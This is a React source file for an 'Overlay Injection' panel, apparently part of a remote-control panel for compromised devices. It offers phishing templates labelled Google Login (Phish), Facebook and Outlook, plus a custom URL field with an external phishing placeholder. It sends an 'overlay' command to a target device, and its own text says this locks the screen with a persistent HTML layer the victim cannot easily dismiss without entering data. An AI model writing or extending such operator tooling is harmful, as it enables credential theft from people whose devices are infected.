import React, { useState } from "react";
import { Card } from "@/components/ui/card";
import { Ghost, ShieldAlert, Globe, Layout, Send, Eye } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";
import { trpc } from "@/lib/trpc";

interface OverlayManagerProps {
  deviceId: number;
}

const TEMPLATES = [
  { id: "google", name: "Google Login (Phish)", url: "/overlays/google.html" },
  { id: "facebook", name: "Facebook Connect", url: "/overlays/facebook.html" },
  { id: "outlook", name: "Microsoft Outlook", url: "/overlays/outlook.html" },
  { id: "custom", name: "Custom URL...", url: "" },
];

export const OverlayManager: React.FC<OverlayManagerProps> = ({ deviceId }) => {
  const [selectedTemplate, setSelectedTemplate] = useState("google");
  const [customUrl, setCustomUrl] = useState("");
  const sendCommand = trpc.devices.sendCommand.useMutation();

  const handleInject = () => {
    const template = TEMPLATES.find(t => t.id === selectedTemplate);
    const finalUrl = selectedTemplate === "custom" ? customUrl : `${window.location.origin}${template?.url}`;

    if (!finalUrl) {
      toast.error("Ruta no válida");
      return;
    }

    sendCommand.mutate({
      deviceId,
      command: "overlay",
      payload: { url: finalUrl }
    }, {
      onSuccess: () => toast.success("Inyección enviada al objetivo"),
      onError: (err) => toast.error(`Error: ${err.message}`)
    });
  };

  return (
    <Card className="glass-panel border-rose-500/20 overflow-hidden">
      <div className="p-4 border-b border-rose-500/10 bg-rose-500/5 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Ghost className="w-4 h-4 text-rose-500" />
          <h2 className="text-xs font-black uppercase tracking-widest text-rose-400">Inyección de Overlays (HTML)</h2>
        </div>
        <Badge variant="outline" className="bg-rose-500/10 text-rose-400 border-rose-500/30 text-[9px]">SYSTEM MODULE</Badge>
      </div>

      <div className="p-6 space-y-6">
        <div className="space-y-2">
          <label className="text-[10px] font-black uppercase text-slate-500 tracking-tighter">Seleccionar Plantilla</label>
          <Select value={selectedTemplate} onValueChange={setSelectedTemplate}>
            <SelectTrigger className="input-neon border-rose-500/20 h-12">
              <SelectValue />
            </SelectTrigger>
            <SelectContent className="bg-black/90 border-rose-500/20 text-rose-100">
              {TEMPLATES.map(t => (
                <SelectItem key={t.id} value={t.id} className="focus:bg-rose-500/20">{t.name}</SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>

        {selectedTemplate === "custom" && (
          <div className="space-y-2 animate-in fade-in slide-in-from-top-2">
             <label className="text-[10px] font-black uppercase text-slate-500 tracking-tighter">URL Personalizada</label>
             <Input 
                value={customUrl} 
                onChange={(e) => setCustomUrl(e.target.value)}
                placeholder="https://servidor-externo.com/phish"
                className="input-neon border-rose-500/20 h-12"
             />
          </div>
        )}

        <div className="p-4 bg-rose-500/5 rounded-2xl border border-rose-500/10 space-y-3">
          <div className="flex items-start gap-3">
            <ShieldAlert className="w-5 h-5 text-rose-500 shrink-0 mt-0.5" />
            <p className="text-[10px] text-rose-300/70 leading-relaxed font-medium">
              Esta acción bloqueará la pantalla del dispositivo con una capa HTML persistente. 
              El objetivo no podrá cerrarla fácilmente sin interactuar con los campos de entrada.
            </p>
          </div>
        </div>

        <div className="flex gap-3">
          <Button 
            className="flex-1 h-12 rounded-xl bg-rose-600 hover:bg-rose-700 text-white font-black uppercase tracking-widest shadow-lg shadow-rose-900/20"
            onClick={handleInject}
            disabled={sendCommand.isPending}
          >
            <Send className="w-4 h-4 mr-2" />
            Inyectar Ahora
          </Button>
          <Button variant="outline" className="h-12 w-12 rounded-xl border-rose-500/20 hover:bg-rose-500/10">
            <Eye className="w-4 h-4 text-rose-400" />
          </Button>
        </div>
      </div>
    </Card>
  );
};

import { Badge } from "@/components/ui/badge";
